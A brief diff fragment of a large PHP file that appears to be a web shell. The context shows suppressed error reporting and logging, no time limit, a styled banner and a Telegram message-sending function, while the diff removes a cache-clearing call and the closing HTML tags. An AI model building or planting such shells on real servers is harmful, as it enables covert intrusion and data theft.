@@ -149,7 +149,6 @@ echo '<font face="Bungee" size="6">Ano' .
 <tr><td>';
 set_time_limit(0);
 error_reporting(0);
-@clearstatcache();
 @ini_set("error_log", null);
 
 
@@ -2189,5 +2188,4 @@ function sendTelegramMessage($botToken, $chatId, $message)
 
 
 
-</body>
-</html>
+
